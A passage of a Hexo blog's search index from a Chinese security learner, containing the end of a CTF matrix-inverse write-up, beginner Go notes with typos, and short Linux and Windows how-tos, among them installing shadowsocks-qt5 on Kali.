class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"> <span class="hljs-number">1</span>  <span class="hljs-number">5</span>  <span class="hljs-number">25</span><br>A = <span class="hljs-number">1</span>  <span class="hljs-number">7</span>  <span class="hljs-number">49</span><br> <span class="hljs-number">1</span>  <span class="hljs-number">9</span>  <span class="hljs-number">81</span><br></code></pre></td></tr></table></figure><p>由矩形对应</p><pre><code>    a11 a12 a13    a21 a22 a23    a31 a32 a331</code></pre><p>由矩阵A得<code>|A|=a11*a22*a33+a12*a23*a31+a13*a21*a32-a13*a22*a31-a12*a21*a33-a11*a23*a32=16</code><br>计算出矩阵A的伴随矩阵</p><figure class="hljs highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">A11=a22 * a33 - a23 * a32=<span class="hljs-number">7</span>*<span class="hljs-number">81</span><span class="hljs-number">-9</span>*<span class="hljs-number">49</span>=<span class="hljs-number">126</span><br>A12= -a21 * a33 + a23 * a31=<span class="hljs-number">-1</span>*<span class="hljs-number">81</span>+<span class="hljs-number">1</span>*<span class="hljs-number">49</span>=<span class="hljs-number">-32</span><br>A13= a21 * a32 - a22 * a31=<span class="hljs-number">1</span>*<span class="hljs-number">9</span><span class="hljs-number">-1</span>*<span class="hljs-number">7</span>=<span class="hljs-number">2</span><br>A21= -a12 * a33 + a13 * a32=<span class="hljs-number">-5</span>*<span class="hljs-number">81</span>+<span class="hljs-number">25</span>*<span class="hljs-number">9</span>=<span class="hljs-number">-180</span><br>A22=a11*a33-a31*a13=<span class="hljs-number">1</span>*<span class="hljs-number">81</span><span class="hljs-number">-1</span>*<span class="hljs-number">25</span>=<span class="hljs-number">56</span><br>A23=-a11*a32+a31*a13=<span class="hljs-number">-1</span>*<span class="hljs-number">9</span>+<span class="hljs-number">1</span>*<span class="hljs-number">5</span>=<span class="hljs-number">-4</span><br>A31=a12*a23-a22*a13=<span class="hljs-number">5</span>*<span class="hljs-number">49</span><span class="hljs-number">-7</span>*<span class="hljs-number">25</span>=<span class="hljs-number">70</span><br>A32=-a11*a33+a21*<span class="hljs-number">13</span>=<span class="hljs-number">-1</span>*<span class="hljs-number">49</span>+<span class="hljs-number">1</span>*<span class="hljs-number">25</span>=<span class="hljs-number">-24</span><br>A33=a11*a22-a21*a12=<span class="hljs-number">1</span>*<span class="hljs-number">7</span><span class="hljs-number">-1</span>*<span class="hljs-number">5</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>所以伴随矩阵得：</p><figure class="hljs highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">A11  A21  A31<br>A12  A22  A32<br>A13  A23  A33<br><br>A11  A21 A31         <span class="hljs-number">126</span>/<span class="hljs-number">16</span>     <span class="hljs-number">-180</span>/<span class="hljs-number">16</span>   <span class="hljs-number">70</span>/<span class="hljs-number">16</span>          <span class="hljs-number">7.875</span>  <span class="hljs-number">-11.25</span>   <span class="hljs-number">4.375</span><br>A*=<span class="hljs-number">16</span>/<span class="hljs-number">1</span>A12  A22 A32    =    <span class="hljs-number">-32</span>/<span class="hljs-number">16</span>       <span class="hljs-number">56</span>/<span class="hljs-number">16</span>   <span class="hljs-number">-24</span>/<span class="hljs-number">16</span>   =   <span class="hljs-number">-2</span>     <span class="hljs-number">3.5</span>      <span class="hljs-number">-1.5</span><br>A13  A23 A33          <span class="hljs-number">2</span>/<span class="hljs-number">16</span>       <span class="hljs-number">-4</span>/<span class="hljs-number">16</span>      <span class="hljs-number">2</span>/<span class="hljs-number">16</span>         <span class="hljs-number">0.125</span>  <span class="hljs-number">-0.25</span>    <span class="hljs-number">0.125</span><br><br><span class="hljs-number">2258</span>x7<span class="hljs-number">.875</span><span class="hljs-number">-2424</span>x11<span class="hljs-number">.25</span>+<span class="hljs-number">2530</span>x4<span class="hljs-number">.375</span>=<span class="hljs-number">2018</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术水文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初学Go语言笔记--1</title>
      <link href="/posts/ac7b27c4.html"/>
      <url>/posts/ac7b27c4.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1eSKbaBiE3KVjSZFMq6zQhVXaK.jpg"></p><a id="more"></a><h2 id="示例-hello-word-go"><a href="#示例-hello-word-go" class="headerlink" title="示例 hello_word.go"></a>示例 hello_word.go</h2><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> <span class="hljs-string">"fmt"</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mian</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Println(<span class="hljs-string">"Hello Word!"</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>import &quot;fmt&quot;</code> ==&gt; 使用<code>fmt</code>包（函数，或其他元素），fmt包实现了格式化IO（输入/输出）的函数。</p><p><strong>导入多个包：</strong></p><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-keyword">import</span> <span class="hljs-string">"fmt"</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">"os"</span><br>或：<br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">"fmt"</span><br>    <span class="hljs-string">"os"</span><br>)<br></code></pre></td></tr></table></figure><p><strong>注：</strong><br>如果导入一个包却没有使用它，则程序在运行时会报错：<code>import and not used：os</code></p><h2 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h2><p>干净、可读的代码和简洁性是 Go 追求的主要目标。通过 gofmt 来强制实现统一的代码风格。Go 语言中对象的命名也应该是简洁且有意义的。像 Java 和 Python 中那样使用混合着大小写和下划线的冗长的名称会严重降低代码的可读性。名<br>称不需要指出自己所属的包，因为在调用的时候会使用包名作为限定符。返回某个对象的函数或方法的名称一般都是使用名词，没有 <code>Get...</code>之类的字符，如果是用于修改某个对象，则使用 <code>SetName</code>。有必须要的话可以使用大小写混合<br>的方式，如 MixedCaps 或 mixedCaps，而不是使用下划线来分割多个名称。</p><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>常量使用关键字 <code>const</code> 定义</p><p>常量定义格式：<code>const identifiler [type] = value</code> ,如：</p><pre><code>const Pi = 3.14159</code></pre><p>类型说明符【type】可以省略，编译器会自动根据值推断其值类型</p><ul><li>显示类型定义：<code>const b = string = &quot;abc&quot;</code></li><li>隐式类型定义：<code>const b = &quot;abc&quot;</code></li></ul><h2 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h2><p>使用 <code>var</code> 关键字 <code>var identifier type</code></p><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-keyword">var</span> a <span class="hljs-keyword">int</span><br><span class="hljs-keyword">var</span> b <span class="hljs-keyword">bool</span><br><span class="hljs-keyword">var</span> str <span class="hljs-keyword">string</span><br>或：<br><span class="hljs-keyword">var</span> (<br>a <span class="hljs-keyword">int</span><br>b <span class="hljs-keyword">bool</span><br>str <span class="hljs-keyword">string</span><br>)<br></code></pre></td></tr></table></figure><p>这种因式分解关键字的写法一般用于声明全局变量。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">"fmt"</span><br><span class="hljs-string">"runtime"</span><br><span class="hljs-string">"os"</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> goos <span class="hljs-keyword">string</span> = runtime.GOOS<br>fmt.Printf(<span class="hljs-string">"The operating system is: %s\n"</span>, goos)<br>path := os.Getenv(<span class="hljs-string">"PATH"</span>)<br>fmt.Printf(<span class="hljs-string">"Path is %s\n"</span>, path)<br>&#125;<br></code></pre></td></tr></table></figure><p>在 Windows 下运行这段代码，则会输出 <code>The operating system is: windows</code> 以及相应的环境变量的值；如果在Linux 下运行这段代码，则会输出 <code>The operating system is: linux</code> 以及相应的的环境变量的值。</p><h2 id="init函数"><a href="#init函数" class="headerlink" title="init函数"></a>init函数</h2><p>变量除了可以在全局声明中初始化，也可以在 init 函数中初始化。这是一类非常特殊的函数，它不能够被人为调用，而是在每个包完成初始化后自动执行，并且执行优先级比 main 函数高。每个源文件都只能包含一个 init 函数。初始化总是以单线程执行，并且按照包的依赖关系顺序执行。一个可能的用途是在开始执行程序之前对数据进行检验或修复，以保证程序状态的正确性。</p><p>示例：</p><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-keyword">package</span> trans<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">"math"</span><br><br><span class="hljs-keyword">var</span> Pi <span class="hljs-keyword">float64</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>Pi = <span class="hljs-number">4</span> * math.Atan(<span class="hljs-number">1</span>) <span class="hljs-comment">// init() function computes Pi</span><br>&#125;<br></code></pre></td></tr></table></figure><p>它在init函数中计算变量Pi的初始值。</p><p>以上示例中导入了包trans，并且使用到了变量Pi：</p><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-keyword">package</span><br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">"fmt"</span><br><span class="hljs-string">"./trans"</span><br>)<br><br><span class="hljs-keyword">var</span> twooPi = <span class="hljs-number">2</span> * trans.Pi<br><br>fuc main() &#123;<br>fmt.Printf(<span class="hljs-string">"2*Pi = %g\n"</span>, rowPi) <span class="hljs-comment">// 2*Pi = 6.283185307179586</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>deepin-ubuntu-kali没有签名无法签证仓库源</title>
      <link href="/posts/f1373c55.html"/>
      <url>/posts/f1373c55.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1Laqbav1H3KVjSZFBq6zSMXXaq.jpg"></p><a id="more"></a><h2 id="deepin-ubuntu-kali更换仓库源提示没有签名"><a href="#deepin-ubuntu-kali更换仓库源提示没有签名" class="headerlink" title="deepin/ubuntu/kali更换仓库源提示没有签名"></a>deepin/ubuntu/kali更换仓库源提示没有签名</h2><p><img src="https://ae01.alicdn.com/kf/HTB1dUKaav1H3KVjSZFH762KppXaT.png"></p><p>通过以下命令添加公钥即可</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys xxxxxxxxx <span class="hljs-comment">#公钥后八位</span><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1Z1KiaBGw3KVjSZFD760WEpXa5.png"></p><p>再重新执行 <strong>apt-get update</strong> 获取软件更新列表</p><p><img src="https://ae01.alicdn.com/kf/HTB1KV9baxiH3KVjSZPf760BiVXai.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术水文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 备忘录 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows 10 右键卡死</title>
      <link href="/posts/19398ee8.html"/>
      <url>/posts/19398ee8.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1dsejaEGF3KVjSZFvq6z_nXXac.jpg"></p><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>今天自己的电脑不知道怎么回事，右键打开所有的文件都打开不了，电脑直接卡死并且弹出【此应用无法在你的电脑上运行】，What？？</p></blockquote><p><img src="https://ae01.alicdn.com/kf/HTB1mD9oaBKw3KVjSZFOq6yrDVXaY.jpg" alt="S"></p><blockquote><p>我打开个txt都打不开了？直接双击打开又可以正常打开，而右键却不行。起初我还以为电脑中病毒了，于是度娘一波，然而找到的都是些某某软件打不开之类的，说什么修改软件属性，以兼容模式运行啥的。但是我的不是应用打不开啊，而是所有文档类的右键打不开，右键就直接卡死。难道还要我重装系统不成？重装，那是不存在的！捣搞了好半天才发现原来是【Adobe】惹的祸</p></blockquote><p><img src="https://ae01.alicdn.com/kf/HTB1O_9oaBKw3KVjSZFO761rDVXaV.png"></p><blockquote><p>Adobe会在右键菜单生产快捷方式，而且Adobe有个插件老是开机自启，禁都禁不掉，但是在几天前我就把那插件改了个名字，用个txt文件替换了它。鼠标右键文件时，电脑找不到Adobe的索引加载不出来，所以电脑会卡死并且会弹出【此应用无法在你的电脑上运行】的提示。于是乎才有了此文。</p></blockquote><p><img src="https://ae01.alicdn.com/kf/HTB1KM5kaBWD3KVjSZFs763qkpXaj.png"></p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>ps：Adobe的插件我是不想让它重新启用的，所以继续使用txt文本替换那个插件【改成exe尾缀】</p><p>打开安全软件，360、电脑管家之类的【我用的是火绒】，然后找到右键管理，把Adobe的选项给去掉即可。</p><p><img src="https://ae01.alicdn.com/kf/HTB10NCkaBWD3KVjSZKP761p7FXaS.png"></p><p><strong>去掉Adobe选项</strong></p><p><img src="https://ae01.alicdn.com/kf/HTB1t91raq1s3KVjSZFA760_ZXXaW.png"></p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 备忘录 </tag>
            
            <tag> win10 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali安装shadowsocks-qt5</title>
      <link href="/posts/3dd71f61.html"/>
      <url>/posts/3dd71f61.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1qUX.awaH3KVjSZFjq6AFWpXar.jpg"></p><a id="more"></a><h3 id="先安装依赖包"><a href="#先安装依赖包" class="headerlink" title="先安装依赖包"></a>先安装依赖包</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get install qt5-qmake qtbase5-dev libqrencode-dev libappindicator-dev libzbar-dev<br></code></pre></td></tr></table></figure><p>如出现错误，在后面加入 <code>--fix-missing</code> 来修正错误</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get install qt5-qmake qtbase5-dev libqrencode-dev libappindicator-dev libzbar-dev --fix-missing<br></code></pre></td></tr></table></figure><h3 id="下载deb包"><a href="#下载deb包" class="headerlink" title="下载deb包"></a>下载deb包</h3><p>到GitHub下载五个deb包<a href="https://github.com/try1try/shadowsocks-qt5" target="_blank" rel="noopener">github</a></p><p><img src="https://ae01.alicdn.com/kf/HTB1mTGaaBaE3KVjSZLe760sSFXaS.png"></p><p>下载完后解压并在终端cd到deb包存放的目录下</p><p><img src="https://ae01.alicdn.com/kf/HTB1M_8.awaH3KVjSZFj763FWpXaX.png"></p><p>然后安装<strong>gdebi</strong>（这里我已经安装过了）</p><p><img src="https://ae01.alicdn.com/kf/HTB1TOCbaCWD3KVjSZSg763CxVXan.png"></p><p>然后分别执行 <strong>gdebi</strong> 刚才下载的5个deb包(以<code>root</code>权限执行)</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdebi libssl1.0.0_1.0.1t-1+deb8u7_amd64.deb<br><br>gdebi libbotan-1.10-0_1.10.8-2+deb8u1_amd64.deb<br><br>gdebi libqtshadowsocks_1.10.0-1_amd64.deb<br><br>gdebi libqtshadowsocks-dev_1.10.0-1_amd64.deb<br><br>gdebi shadowsocks-qt5_2.8.0-1_amd64.deb<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1UTKaaBaE3KVjSZLe760sSFXaB.png"></p><h3 id="在应用找到小飞机并启动它"><a href="#在应用找到小飞机并启动它" class="headerlink" title="在应用找到小飞机并启动它"></a>在应用找到小飞机并启动它</h3><p><img src="https://ae01.alicdn.com/kf/HTB1fmGXaECF3KVjSZJn762nHFXap.png"></p><p>配置小飞机相关参数即可</p><p><img src="https://ae01.alicdn.com/kf/HTB15_afaBCw3KVjSZFl763JkFXa0.png"></p><p>update：2018-10-22</p><h3 id="另一种安装方式，是通过添加deepin的源来安装"><a href="#另一种安装方式，是通过添加deepin的源来安装" class="headerlink" title="另一种安装方式，是通过添加deepin的源来安装"></a>另一种安装方式，是通过添加deepin的源来安装</h3><p>编辑/etc/apt/sources.list文件(需要使用sudo), 在文件最前面添加以下条目(操作前请做好相应备份)</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">deb [by-hash=force] http://mirrors.aliyun.com/deepin panda main contrib non-free<br></code></pre></td></tr></table></figure><p>然后 apt-get update 更新下列表</p><p>再执行以下命令进行安装</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get install shadowsocks-qt5<br></code></pre></td></tr></table></figure><p>update：2019-05-27</p><h3 id="使用github上纸飞机项目给出的可执行程序"><a href="#使用github上纸飞机项目给出的可执行程序" class="headerlink" title="使用github上纸飞机项目给出的可执行程序"></a>使用github上纸飞机项目给出的可执行程序</h3><p>download：<code>https://github.com/shadowsocks/shadowsocks-qt5/releases</code></p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo chmod +x Shadowsocks-Qt5-3.0.1-x86_64.AppImage<br>./Shadowsocks-Qt5-3.0.1-x86_64.AppImage<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1Vs9aaBWD3KVjSZKP761p7FXa0.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术水文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 备忘录 </tag>
            
            <tag> kali </tag>
            
            <tag> shadowsocks-qt5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156.html"/>
      <url>/posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">"My New Post"</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/404.html"/>
      <url>/404.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><!DOCTYPE HTML><html>    <head>    <meta http-equiv="content-type" content="text/html;charset=utf-8;">    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    <meta name="robots" content="all">    <meta name="robots" content="index,follow">    <link rel="stylesheet" type="text/css" href="https://qzone.qq.com/gy/404/style/404style.css"><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Kuiba's blog" type="application/atom+xml"></head>    <body>    <script type="text/plain" src="http://www.qq.com/404/search_children.js" charset="utf-8" homepageurl="/" homepagename="回到我的主页"></script>    <script src="https://qzone.qq.com/gy/404/data.js" charset="utf-8"></script>    <script src="https://qzone.qq.com/gy/404/page.js" charset="utf-8"></script>  </body></html>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>404</title>
      <link href="//404.html"/>
      <url>//404.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><!DOCTYPE html><html lang="en"><head>]\<meta charset="UTF-8"><title>404</title><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Kuiba's blog" type="application/atom+xml"></head><body><script type="text/javascript" src="//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js" charset="utf-8" homepageurl="/" homepagename="回到我的主页"></script></body></html>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><font color="#1bcc7c" size="5"><strong>#</strong></font> <font color="black" size="5"><strong>Motto</strong></font></p><p>&emsp; Listen to self own voice</p><p><font color="#1bcc7c" size="5"><strong>#</strong></font> <font color="black" size="5"><strong>Contact</strong></font></p><p><img src="https://s1.ax1x.com/2020/05/13/YUcojI.jpg"></p><ul><li><p>Blog：<a href="https://kuibarj.top/">Kuiba’s blog</a></p></li><li><p>Email：VpYmFoZEBmb3htYWlsLmNvbQ</p></li><li><p>简述：小二是一名正在安全道路上奋斗的菜鸡，很菜，没什么技术，本博客记录自己的学习经历和笔记。</p></li></ul>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>search</title>
      <link href="/search/index.html"/>
      <url>/search/index.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>HTB搬运</title>
      <link href="/categories/HTB%E6%90%AC%E8%BF%90/index.html"/>
      <url>/categories/HTB%E6%90%AC%E8%BF%90/index.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>技术水文</title>
      <link href="/categories/%E6%8A%80%E6%9C%AF%E6%B0%B4%E6%96%87/index.html"/>
      <url>/categories/%E6%8A%80%E6%9C%AF%E6%B0%B4%E6%96%87/index.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>工具</title>
      <link href="/categories/%E5%B7%A5%E5%85%B7/index.html"/>
      <url>/categories/%E5%B7%A5%E5%85%B7/index.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞复现</title>
      <link href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html"/>
      <url>/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>杂项</title>
      <link href="/categories/%E6%9D%82%E9%A1%B9/index.html"/>
      <url>/categories/%E6%9D%82%E9%A1%B9/index.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>搬运区</title>
      <link href="/categories/%E8%BD%AC%E8%BD%BD%E6%90%AC%E8%BF%90/index.html"/>
      <url>/categories/%E8%BD%AC%E8%BD%BD%E6%90%AC%E8%BF%90/index.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>编程语言</title>
      <link href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/index.html"/>
      <url>/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/index.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script>]]></content>
      
    </entry>
    
    
  
</search>
